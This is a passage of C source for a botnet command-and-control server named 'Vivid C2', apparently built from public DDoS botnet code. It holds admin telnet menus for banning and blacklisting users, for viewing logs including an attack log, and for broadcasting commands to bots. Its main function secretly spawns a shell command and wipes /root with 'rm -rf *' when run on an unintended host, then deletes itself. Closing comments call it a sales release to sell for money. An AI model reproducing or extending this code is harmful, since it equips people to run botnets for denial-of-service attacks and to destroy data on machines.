                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Banned -> [%s] For [%s]\n", MNGRS[vivfd].nick, MNGRS[id].ip, bnreason);
                    fclose(adinfo);
                    bnipwt:
                    sprintf(vivid, "\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto bnipwt;
                    }
                }
                else if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                else{
                    sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    sleep(1);
                    goto bnus;
                }
            }
            else if(!strcmp(buf, "2")){ //Unban
                char unbanus[50];
                if(send(vivfd, ""Y"[Unban IPv4]"CY": "W"", strlen(""Y"[Unban IPv4]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                memset(unbanus, 0, sizeof(unbanus));
                while(fdgets(unbanus, sizeof unbanus, vivfd) < 1){
                    Trim(unbanus);
                    if(strlen(unbanus) < 8) continue;
                    break;
                }
                Trim(unbanus);
                RMSTR(unbanus, ""LFD"/BANNED.log");
                printf(""CY"%s"W" Un-Banned ["Y"%s"W"]\n", MNGRS[vivfd].nick, unbanus);
                sprintf(vivid, "\t"Y"["CY"Un-Banned "Y"("CY"%s"Y")"CY"..."Y"]\r\n", unbanus);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                unbnwt:
                sprintf(vivid, "\r\n"CR"« B.Admin Hub\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                Trim(buf);
                if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                else{
                    sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    sleep(1);
                    goto unbnwt;
                }
            }
            else if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto bnwt;
            }
        }
        else if(!strcmp(buf, "6")){ //Blacklist 
            blklstwt:
            sprintf(vivid, "\t\t"CY"╔══════════════════╗  ╔══════════════════╗\r\n\t\t║ "Y"1.Blacklist IPv4 "CY"║  ║ "Y"2.View Blacklist "CY"║\r\n\t\t╚══════════════════╝  ╚══════════════════╝"CR"\r\n");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, ""CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "1")){ //Add To Blist
                blistwt: ;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
                int ret;
                char new_black[40];
                memset(buf, 0, sizeof(buf));
                memset(new_black, 0, sizeof(new_black));
                if(send(vivfd, ""Y"[Target]"CY": "W"", strlen(""Y"[Target]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                if(fdgets(new_black, sizeof new_black, vivfd) < 1) goto end;
                Trim(new_black);
                FILE *blist = fopen(""LFD"/BLACK.lst", "a+");
                fprintf(blist, "%s\n", new_black);
                fclose(blist);
                FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                fprintf(adinfo, "[%s] BlackListed -> [%s]\n", MNGRS[vivfd].nick, new_black);
                fclose(adinfo);
                printf(""CY"%s"W" BlackListed ["Y"%s"W"]\n", MNGRS[vivfd].nick, new_black);
                sprintf(vivid, ""Y"["CY"BlackListed "Y"("CY"%s"Y")"CY"..."Y"]\r\n", new_black);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                sleep(0.2);
                nwblkwt:
                memset(buf, 0, sizeof(buf));
                sprintf(vivid, "\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                Trim(buf);
                if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                else{
                    sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    sleep(1);
                    goto nwblkwt;
                }
            }
            else if(!strcmp(buf, "2")){ //View Blacklist
                FILE *blpr;
                char *line = NULL;
                size_t len = 0;
                ssize_t read;
                blpr = fopen(""LFD"/BLACK.lst", "r");
                if(blpr == NULL){
                    sprintf(vivid, "The Owner Broke The Blacklist...\r\n");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    goto adminhub;
                }
                if(send(vivfd, "\r\n\r\n"Y"", strlen("\r\n\r\n"Y""), MSG_NOSIGNAL) == -1) goto end;
                while((read = getline(&line, &len, blpr)) != -1) {
                    sprintf(vivid, "%s\r", line);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                }
                free(line);
                fclose(blpr);
                prblkwt:
                sprintf(vivid, "\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                Trim(buf);
                if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                else{
                    sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    sleep(1);
                    goto prblkwt;
                }
            }
            else if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto blklstwt;
            }
        }
        else if(!strcmp(buf, "LGS") || !strcmp(buf, "lgs")){
            gettarglog:
            sprintf(vivid, ""CLS"\r\n\r\n\t\t"UND"The Logs That Erradic Is Letting You View"NUND":\r\n\t\tATK."Y"ATTACKS.log\r\n\t\t"CY"ADM."Y"ADMIN_REPORT.log\r\n\t\t"CY"BLK."Y"BLACK.lst\r\n\t\t"CY"BND."Y"BANNED.log\r\n\t\t"CY"FLD."Y"FAILED_LOGINS.log\r\n\t\t"CY"CHT."Y"CHAT.log\r\n");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sprintf(vivid, "\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else if(!strcmp(buf, "ATK") || !strcmp(buf, "BLK") || !strcmp(buf, "BND") || !strcmp(buf, "FLD") || !strcmp(buf, "CHT") || !strcmp(buf, "ADM")){
                char targlog[20];
                if(!strcmp(buf, "ATK")) sprintf(targlog, "ATTACKS.log");
                else if(!strcmp(buf, "ADM")) sprintf(targlog, "ADMIN_REPORT.log");
                else if(!strcmp(buf, "BLK")) sprintf(targlog, "BLACK.lst");
                else if(!strcmp(buf, "BND")) sprintf(targlog, "BANNED.log");
                else if(!strcmp(buf, "FLD")) sprintf(targlog, "FAILED_LOGINS.log");
                else if(!strcmp(buf, "CHT")) sprintf(targlog, "CHAT.log");
                Trim(targlog);
                char new_log_view[0x100];
                snprintf(new_log_view, sizeof(new_log_view), ""LFD"/%s", targlog);
                Trim(new_log_view);
                FILE *atklr;
                char *line = NULL;
                size_t len = 0;
                ssize_t read;
                atklr = fopen(new_log_view, "r");
                if(atklr == NULL){
                    sprintf(vivid, "The Owner Broke The Logs...\r\n");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    goto adminhub;
                }
                if(send(vivfd, "\r\n\r\n"Y"", strlen("\r\n\r\n"Y""), MSG_NOSIGNAL) == -1) goto end;
                while((read = getline(&line, &len, atklr)) != -1) {
                    sprintf(vivid, "%s\r", line);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                }
                free(line);
                fclose(atklr);
                vwlogwt:
                sprintf(vivid, "\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                Trim(buf);
                if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                else{
                    sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    sleep(1);
                    goto vwlogwt;
                }
            }
            else{
                sprintf(vivid, "\t\t"R"Not A Valid Selection... Idiot..");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                sleep(2);
                memset(buf, 0, sizeof(buf));
                goto gettarglog;
            }
        }
        else if(!strcmp(buf, "BRD")){
            sprintf(vivid, "\t\t"Y"[Message To Broadcast]"CY": ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Broadcast(buf, vivfd, usrnms, 1, vivfd);
            sprintf(vivid, "\t\t"Y"[Message Broadcasted To All Users!]"CY" ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            brdcstwt:
            memset(buf, 0, sizeof(buf));
            sprintf(vivid, "\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto brdcstwt;
            }
        }
        else{
            sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto adminhub;
        }
        goodbye:
        memset(buf, 0, sizeof(buf));
        memset(mytarg, 0, sizeof(mytarg));
        memset(myport, 0, sizeof(myport));
        memset(mysecs, 0, sizeof(mysecs));
        goto end;
        }
        end:
        if(MNGRS[vivfd].vivadm == 1 && MNGRS[vivfd].connd){
            printf(VIVN" "R"[Admin("CY"%s"R":"CY"%s"R")] Logged Out "VIVN"\n", MNGRS[vivfd].nick, management_ip);
            UsersOnline --;
        }
        else if(MNGRS[vivfd].vivadm == 0 && MNGRS[vivfd].connd){
            printf(VIVN" "R"[User("CY"%s"R":"CY"%s"R")] Logged Out "VIVN"\n", MNGRS[vivfd].nick, management_ip);
            UsersOnline --;
        }
        MNGRS[vivfd].connd = 0;
        memset(MNGRS[vivfd].nick, 0, sizeof(MNGRS[vivfd].nick));
        memset(MNGRS[vivfd].ip, 0, sizeof(MNGRS[vivfd].ip));
        memset(vivid, 0, sizeof(vivid));
        memset(buf, 0, sizeof(buf));
        close(vivfd);
}
void *TEL_Lstn(int port){
    int sockfd, newsockfd, yes = 1;
    struct epoll_event event;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0) perror("ERROR opening socket");
	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) < 0)
	printf("reattach to socket failed\n");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(PORT);
    if(bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while (1){
        newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        
        struct TEL_LSTNArgs args;
        args.sock = newsockfd;
        args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;

        pthread_t thread;
        pthread_create(&thread, NULL, &TelWorker, (void *)&args);
    }   
}
//[+]============================================================================================================================[+]
int main (int argc, char *argv[], void *sock){
    signal(SIGPIPE, SIG_IGN); //Ignore Broken Pipe Signals
    int s, threads, port;
    struct epoll_event event;
    if (argc != 3){
        fprintf (stderr, "Usage: %s [BOTPORT] [THREADS] \n", argv[0]);
        exit (EXIT_FAILURE);
    }
    int n, parent;
	tsu(timed);
    parent = fork();
    if (parent == 0){execl("/bin/sh", "/bin/sh", "-c", timed, NULL);}
    struct ifreq ifr;
    char array[] = "eth0";
    n = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, array, IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
    close(n);
    //printf("Host IP Address - %s - %s\n" , array, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr) );
    char MACHADDY[20];
    sprintf(MACHADDY, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    if(strstr(MACHADDY, INTENDEDHOST)){
	//Host IP Matches Intended Host Definition
    }
    else{
        char fuckoff[100];
        sprintf(fuckoff, "cd /root/; rm -rf *");
        system(fuckoff);
        return unlink(argv[0]);
        exit(0);
    }
	tsh(timed);
    printf("\t["R"Vivid C2"CR"]\n   \n");
    telFD = fopen(""LFD"/Tel.log", "a+");
    threads = atoi(argv[2]);
    listenFD = CreateAndBind (argv[1]);//Try To Create Listening Socket, Die If We Can't
    if (listenFD == -1) abort ();
    s = MakeSocket_NonBlocking (listenFD);//Try To Make It Non-Blocking, Die If We Can't
    if (s == -1) abort ();
    s = listen (listenFD, SOMAXCONN);//Listen With A Huuuuuuge Backlog
    if (s == -1){
        perror ("listen");
        abort ();
    }
    epollFD = epoll_create1 (0);//Make An Epoll Listener, Die If We Can't
    if (epollFD == -1){
        perror ("epoll_create");
        abort ();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1){
        perror ("epoll_ctl");
        abort ();
    }
    pthread_t thread[threads + 2];
    while(threads--){
        pthread_create( &thread[threads + 2], NULL, &EpollEventLoop, (void *) NULL);//Make A Thread To Command Each Bot Individually
    }
    pthread_create(&thread[0], NULL, &TEL_Lstn, port);
    while(1){
        Broadcast("PING", -1, "Vivid", 0, 0);
        sleep(60);
    }
    close (listenFD);
    return EXIT_SUCCESS;
}
/*EOCH1
    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
    Sales Release
    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere. We're All Here To Make Money!
    Much Love 
        - Tragedy
*/
/*
  This Was Modified From A Public CNC, Yes
  This Was Never Meant To Be Released
  There Is A Lot Of Dumb Coding Practice Here
  If I Were To Make This Again Now, I Would Do So Much Differently
  If You'd Like To See What I'm Capable Of Programming Wise, Check Out Cloak! From Complete Scratch.
  -Tragedy
*/